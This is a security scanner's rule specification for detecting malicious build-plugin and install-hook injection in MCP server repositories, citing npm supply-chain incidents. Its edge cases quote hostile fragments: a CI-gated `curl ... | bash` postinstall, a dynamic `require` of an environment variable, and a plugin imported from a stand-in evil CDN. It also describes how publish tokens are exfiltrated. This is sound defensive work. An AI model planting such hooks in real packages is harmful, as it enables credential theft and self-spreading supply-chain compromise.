---
rule_id: L2
interface_version: v2
severity: critical

threat_refs:
  - kind: cve
    id: CVE-2026-27606
    url: https://nvd.nist.gov/vuln/detail/CVE-2026-27606
  - kind: incident
    id: npm-chalk-debug-2025-09
    url: https://socket.dev/blog/npm-supply-chain-attack-chalk-debug-september-2025
    summary: >
      September 2025 npm supply chain incident — maintainer accounts for
      chalk and debug were compromised; versions containing Rollup and
      esbuild "plugin" hooks were published. The plugins executed during
      downstream bundling, exfiltrating build-time environment variables
      and injecting a loader stub into the output artefact BEFORE the
      package was published onward, making the compromise self-propagating.
  - kind: incident
    id: shai-hulud-nov-2025
    url: https://blog.socket.dev/shai-hulud-npm-worm-analysis
    summary: >
      November 2025 — the Shai-Hulud npm worm used a build-plugin +
      postinstall chain to read ~/.npmrc during bundling, exfiltrate
      publish tokens via a plugin fetch, and re-publish the infected
      package back to the registry. Build-plugin hooks (generateBundle,
      transform, load) ran in the bundler's own process with full node
      privileges; --ignore-scripts did NOT protect.

lethal_edge_cases:
  - >
    Conditional postinstall gated on an environment variable — the script
    reads `if [ "$CI" = "true" ]; then curl ... | bash; fi`. Static
    reviewers see a harmless-looking install line, but CI runners match
    the gate and execute the payload. The rule MUST flag install-time
    scripts whose text contains both an env-var read and a
    fetch-and-exec token, even when the env-var gate is ostensibly
    "off by default".
  - >
    Plugin loaded via require(dynamicExpression) — build config does
    `require(process.env.PLUGIN_NAME)` or `import(pluginUrl)`. A static
    regex for "require('rollup-plugin-...')" misses this because the
    argument is computed. The rule walks the AST of build-config files
    and classifies any `require`/`import` whose argument is NOT a plain
    string literal as a "dynamic-plugin-load" finding.
  - >
    devDependency that runs during prod install — package.json declares
    `"devDependencies": { "evil-plugin": "..." }` but its postinstall
    reads auth tokens even when npm is invoked with --production.
    Because devDependencies may still trigger postinstall when
    install-peers runs OR when downstream consumers install with
    --include=dev (CI default in many repos), the rule flags dangerous
    install hooks regardless of which dep section the package lives in.
  - >
    Build-plugin hook body calls fetch/writeFile/exec on user-controlled
    paths — the plugin executes legitimately, but the compile phase
    (generateBundle / transform / load / resolveId) contains a network
    call or child_process.exec that persists state across the build. The
    rule walks build-config ASTs (rollup.config.*, vite.config.*,
    webpack.config.*, esbuild script files) and emits a finding when any
    function literal attached to those hook names invokes a dangerous
    API.
  - >
    Plugin imports from a URL (ESM-over-HTTPS) — some modern bundlers
    accept `import pluginFn from "https://cdn.evil/plugin.js"` inside
    the build config. This is the cleanest form of the attack; the
    plugin code is not in the project's dependency tree at all and
    cannot be audited via npm audit. The rule flags any `import` /
    `require` whose source string begins with `http://` or `https://`.

edge_case_strategies:
  - package-json-install-hook-scan
  - build-config-ast-walk
  - dangerous-hook-api-detection
  - dynamic-plugin-load-detection
  - url-plugin-import-detection

evidence_contract:
  minimum_chain:
    source: true
    propagation: false
    sink: true
    mitigation: true
    impact: true
  required_factors:
    - dangerous_hook_api_call
    - install_time_fetch_primitive
    - plugin_from_url_source
  location_kinds:
    - config
    - source

obsolescence:
  retire_when: >
    The npm / pnpm / yarn toolchain ships `--ignore-scripts` AND
    build-plugin-sandbox as the default install mode, OR the ecosystem
    adopts sigstore-signed bundler plugins with mandatory capability
    declarations that the bundler runtime enforces.
---

# L2 — Malicious Build Plugin Injection

**Author:** Senior MCP Threat Researcher persona.
**Applies to:** MCP server repositories that declare build-lifecycle
hooks in `package.json` OR include a build configuration
(rollup/vite/webpack/esbuild) in their source tree.

## Scope — why this is distinct from K9

K9 flags dangerous post-install hooks inside `package.json` scripts. L2
adds coverage for the **build phase**, which is the step between
`npm install` and `npm publish`. The MCP ecosystem publishes bundled
artefacts; a build plugin that runs with full node privileges during
bundling can:

1. Inject a loader stub into `dist/index.js` that activates only at
   runtime inside the downstream agent.
2. Exfiltrate the repository's secrets (NPM_TOKEN, ANTHROPIC_API_KEY,
   AWS_*) read from the CI environment.
3. Path-traverse and write to arbitrary filesystem locations
   (CVE-2026-27606).
4. Self-propagate by rewriting `package.json` to include itself as a
   devDependency before the `npm publish` step runs.

`--ignore-scripts` does NOT protect against build-phase plugins — the
plugin runs inside the bundler process, not as a lifecycle hook.

## What an auditor accepts as evidence

1. **Plugin identity** — the finding cites either:
   - a `config`-kind Location at `package.json /scripts/<hook>` for
     install-time hooks, OR
   - a `source`-kind Location at the exact line / col of the dangerous
     API call inside a build-config file.
2. **API classification** — the rule names the dangerous API (`exec`,
   `spawn`, `fetch`, `writeFile` outside `outDir`, `require` with
   non-literal argument, `import` from an `http(s):` URL). This is what
   the finding's `dangerous_hook_api_call` factor records.
3. **Hook binding** — the dangerous call sits inside a function literal
   passed to a known build-plugin hook: `generateBundle`, `transform`,
   `load`, `resolveId`, `buildStart`, `buildEnd`, `writeBundle`,
   `onBuild`, `compiler.plugin(...)`. The chain's propagation (or
   direct source→sink adjacency) reflects the binding.
4. **Impact scenario** — tied to CVE-2026-27606 or the Shai-Hulud worm
   precedent, naming the concrete compromise chain: build-time fetch →
   plugin exfiltrates secrets → compromised package re-published.

## Why confidence is capped at 0.85

Bundler plugins legitimately read and write files during the build;
the rule cannot always prove the file is outside the configured output
directory without a full symbolic analysis. The 0.85 cap acknowledges
that not every plugin-hook fetch or exec is malicious; it IS always a
capability that should be documented and reviewed.
